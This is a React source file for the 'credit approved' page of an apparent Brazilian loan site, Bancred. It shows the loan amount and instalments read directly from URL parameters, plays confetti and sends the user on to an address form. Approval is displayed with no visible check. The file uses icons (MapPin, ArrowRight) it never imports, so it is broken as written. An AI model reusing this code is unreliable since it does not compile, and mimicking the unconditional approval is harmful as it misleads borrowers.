import { useEffect, useMemo } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import confetti from "canvas-confetti";
import {
  CheckCircle2,
  ShieldCheck,
  Clock,
  Wallet,
  CalendarClock,
  FileText,
  Banknote,
  Pencil,
} from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import ConsultorCard from "@/components/ConsultorCard";
import { calcularParcelaMensal } from "@/lib/loanMath";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const Aprovado = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();

  const valor = Number(params.get("valor") || 9000);
  const parcelas = Number(params.get("parcelas") || 36);
  const nomeRaw = params.get("nome") || "";
  const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();

  // Mesma lógica única (src/lib/loanMath.ts) usada em /oferta e /dashboard
  const parcelaMensal = useMemo(
    () => calcularParcelaMensal(valor, parcelas),
    [valor, parcelas],
  );

  const primeiraParcela = useMemo(() => {
    const d = new Date();
    d.setDate(d.getDate() + 90);
    return d.toLocaleDateString("pt-BR");
  }, []);

  const handleContinue = () => {
    const qs = new URLSearchParams(params);
    navigate(`/endereco?${qs.toString()}`);
  };

  // 🎉 Comemoração curta e suave ao entrar na tela de aprovação
  useEffect(() => {
    const colors = ["#1C68E3", "#3B82F6", "#60A5FA", "#22C55E", "#16A34A", "#86EFAC"];
    const duration = 1500;
    const end = Date.now() + duration;

    // Uma única explosão central, leve
    confetti({
      particleCount: 90,
      spread: 90,
      startVelocity: 40,
      origin: { x: 0.5, y: 0.35 },
      colors,
      ticks: 200,
    });

    // Chuva curta pelas laterais
    const interval = window.setInterval(() => {
      if (Date.now() > end) {
        window.clearInterval(interval);
        return;
      }
      confetti({
        particleCount: 10,
        angle: 60,
        spread: 60,
        startVelocity: 40,
        origin: { x: 0, y: 0.3 },
        colors,
        ticks: 200,
      });
      confetti({
        particleCount: 10,
        angle: 120,
        spread: 60,
        startVelocity: 40,
        origin: { x: 1, y: 0.3 },
        colors,
        ticks: 200,
      });
    }, 250);

    return () => window.clearInterval(interval);
  }, []);

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#F4F4F7",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
        }}
      >
        <img src={logo} alt="Bancred" style={{ height: 76, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "24px 16px", maxWidth: 480, margin: "0 auto" }}>
        <div style={{ marginBottom: 16 }}>
          <ConsultorCard />
        </div>
        <div style={{ textAlign: "center", marginBottom: 18 }}>
          <div
            style={{
              width: 72,
              height: 72,
              borderRadius: "50%",
              background: "#DCFCE7",
              color: "#16A34A",
              display: "inline-flex",
              alignItems: "center",
              justifyContent: "center",
              marginBottom: 14,
            }}
          >
            <CheckCircle2 size={36} strokeWidth={2.5} />
          </div>
          <h1 style={{ fontSize: 24, fontWeight: 700, color: "#111827", marginBottom: 4 }}>
            Crédito aprovado!
          </h1>
          <p style={{ fontSize: 14, color: "#6B7280" }}>
            Parabéns, {primeiroNome}. Sua proposta está pronta.
          </p>
        </div>

        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 22,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
            marginBottom: 12,
          }}
        >
          <div style={{ fontSize: 12, color: "#6B7280", textTransform: "uppercase", letterSpacing: 0.5 }}>
            Valor aprovado
          </div>
          <div style={{ fontSize: 34, fontWeight: 800, color: "#1C68E3", marginTop: 4, marginBottom: 8 }}>
            {formatBRL(valor)}
          </div>
          <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 6,
                background: "#DCFCE7",
                color: "#15803D",
                fontSize: 12,
                fontWeight: 600,
                padding: "4px 10px",
                borderRadius: 999,
              }}
            >
              <ShieldCheck size={12} /> Liberação imediata após confirmação
            </div>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 6,
                background: "#EFF6FF",
                color: "#1C68E3",
                fontSize: 12,
                fontWeight: 600,
                padding: "4px 10px",
                borderRadius: 999,
              }}
            >
              <Clock size={12} /> 90 dias para começar a pagar!
            </div>
          </div>
        </div>

        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 18,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
            marginBottom: 12,
          }}
        >
          {[
            { Icon: Wallet, label: "Parcela mensal", value: formatBRL(parcelaMensal) },
            { Icon: CalendarClock, label: "1ª parcela", value: primeiraParcela },
            { Icon: ShieldCheck, label: "Total de parcelas", value: `${parcelas}x` },
          ].map((row, idx, arr) => (
            <div key={row.label}>
              <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <span
                  style={{
                    width: 32,
                    height: 32,
                    borderRadius: 8,
                    background: "#EFF6FF",
                    color: "#1C68E3",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    flexShrink: 0,
                  }}
                >
                  <row.Icon size={16} />
                </span>
                <div style={{ flex: 1, fontSize: 13, color: "#6B7280" }}>{row.label}</div>
                <div style={{ fontSize: 14, fontWeight: 700, color: "#111827" }}>{row.value}</div>
              </div>
              {idx < arr.length - 1 && <div style={{ height: 1, background: "#E5E7EB", margin: "12px 0" }} />}
            </div>
          ))}
        </div>

        <div
          style={{
            background: "#EFF6FF",
            borderRadius: 16,
            padding: 18,
            border: "1px solid #DBEAFE",
            marginBottom: 18,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
            <CheckCircle2 size={18} color="#1C68E3" />
            <span style={{ fontSize: 15, fontWeight: 700, color: "#111827" }}>Próximos Passos</span>
          </div>
          <ul style={{ listStyle: "none", padding: 0, margin: 0, display: "flex", flexDirection: "column", gap: 10 }}>
            {[
              { Icon: FileText, text: "Finalize seu cadastro na plataforma" },
              { Icon: MapPin, text: "Informe endereço para receber carnê pelos Correios" },
              { Icon: Banknote, text: "O valor será transferido para você via Pix" },
            ].map(({ Icon, text }) => (
              <li key={text} style={{ display: "flex", alignItems: "flex-start", gap: 10 }}>
                <span
                  style={{
                    width: 24,
                    height: 24,
                    borderRadius: "50%",
                    background: "#FFFFFF",
                    color: "#1C68E3",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    flexShrink: 0,
                    marginTop: 1,
                    border: "1px solid #DBEAFE",
                  }}
                >
                  <Icon size={14} />
                </span>
                <span style={{ fontSize: 13, color: "#111827", lineHeight: 1.4 }}>{text}</span>
              </li>
            ))}
          </ul>
        </div>

        <button
          type="button"
          onClick={handleContinue}
          style={{
            width: "100%",
            padding: "15px 20px",
            background: "#1C68E3",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 16,
            fontWeight: 700,
            letterSpacing: -0.2,
            cursor: "pointer",
            boxShadow: "0 8px 24px rgba(28,104,227,0.28)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 8,
            minHeight: 52,
          }}
        >
          Finalizar cadastro <ArrowRight size={16} />
        </button>
        <p style={{ fontSize: 11, color: "#9CA3AF", textAlign: "center", marginTop: 14 }}>
          Apenas mais alguns passos para receber seu valor.
        </p>
      </main>
    </div>
  );
};

export default Aprovado;
